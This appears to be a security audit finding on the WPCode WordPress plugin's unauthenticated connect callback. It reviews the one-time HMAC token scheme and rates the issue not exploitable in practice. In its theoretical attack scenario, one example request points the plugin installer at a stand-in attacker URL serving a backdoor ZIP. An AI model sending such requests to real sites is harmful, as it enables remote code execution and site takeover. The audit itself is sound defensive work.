# WPCODE-MANUAL-001: Unauthenticated Plugin Installation via Connect Process

## Classification
- **Type:** Race-Window Remote Code Execution (Theoretical)
- **Verdict:** Informational / Design Concern — NOT EXPLOITABLE in practice
- **Severity:** Low (theoretical high, but preconditions are unrealistic)
- **CVSS:** N/A (standard industry pattern, not a vulnerability)
- **Unauthenticated:** Yes — the endpoint itself requires no authentication

## Affected Code

**File:** `includes/lite/admin/class-wpcode-connect.php`

### Hook Registration (Line 34)
```php
add_action( 'wp_ajax_nopriv_wpcode_connect_process', array( $this, 'process' ) );
```

### Process Method (Lines 146-264)
```php
public function process() {
    // No nonce verification, no capability check
    $post_oth = ! empty( $_REQUEST['oth'] ) ? sanitize_text_field( wp_unslash( $_REQUEST['oth'] ) ) : '';
    $post_url = ! empty( $_REQUEST['file'] ) ? esc_url_raw( wp_unslash( $_REQUEST['file'] ) ) : '';

    // Verify HMAC token
    $oth = get_option( 'wpcode_connect_token' );
    if ( hash_hmac( 'sha512', $oth, wp_salt() ) !== $post_oth ) {
        wp_send_json_error( $error );
    }

    delete_option( 'wpcode_connect_token' );  // Single-use

    // ... eventually:
    $installer->install( $post_url );  // Installs plugin from attacker-supplied URL
    activate_plugin( $plugin_basename );  // Activates it
}
```

## Flow Description

1. **Token Generation (admin-only, line 102-106):** When an admin clicks "Connect" in settings, `generate_url()` generates `$oth = hash('sha512', wp_rand())`, stores raw `$oth` in `wpcode_connect_token` option, and sends `hash_hmac('sha512', $oth, wp_salt())` to the browser.

2. **Browser Redirect:** The admin's browser opens `https://upgrade.wpcode.com/` with the HMAC token. The WPCode server validates the license key and calls back to the site.

3. **Callback (unauthenticated, lines 146-264):** The WPCode server (or any caller with the token) sends `oth` (HMAC value) and `file` (plugin ZIP URL) to `admin-ajax.php?action=wpcode_connect_process`. If the HMAC matches, the plugin is installed and activated.

## Why This Is Not Exploitable

### Token Security
- `$oth` is `hash('sha512', wp_rand())` — 512-bit hash of cryptographically random value
- Verification uses `hash_hmac('sha512', $oth, wp_salt())` — keyed with site-specific salt
- Token is single-use: deleted immediately after verification (line 166)
- Token only exists during the brief window when admin initiates the Connect flow

### Attack Prerequisites (ALL required simultaneously)
1. Admin must have **just** clicked the "Connect" button (creating the token)
2. Attacker must obtain the HMAC'd token value before:
   - The legitimate callback from wpcode.com consumes it, OR
   - The token is otherwise deleted
3. The HMAC'd value is only exposed to:
   - The admin's browser (in JSON response)
   - The upgrade.wpcode.com server (in URL parameter)
   - Network observers (if HTTPS is compromised)

### Mitigating Factors
- Token window is typically seconds to minutes
- `wp_rand()` uses `openssl_random_pseudo_bytes` on modern PHP
- HMAC keyed with `wp_salt()` prevents rainbow table attacks
- `esc_url_raw()` on `$post_url` restricts to http/https schemes
- This exact pattern is used by WPForms, MonsterInsights, All in One SEO, SeedProd, and other Awesome Motive plugins with combined 20M+ installs

## Theoretical Attack Scenario

If an attacker could exploit a **separate** vulnerability to read the `wpcode_connect_token` option from the database during the brief window it exists, they could:

1. Compute `hash_hmac('sha512', $token, wp_salt())` (also requires knowing wp_salt)
2. Call `admin-ajax.php?action=wpcode_connect_process&oth=<hmac>&file=https://evil.com/backdoor.zip`
3. Achieve full RCE via malicious plugin installation

This requires two separate pre-existing vulnerabilities (option read + salt read), making it a chained exploit that is not attributable to WPCode itself.

## Conclusion

This is a **well-implemented one-time token scheme** for a legitimate use case (remote plugin installation during upgrade flow). The security model is sound. The endpoint being `nopriv` is intentional — the callback comes from an external server, not from the admin's browser session. No practical exploitation path exists without pre-existing compromise of the site.
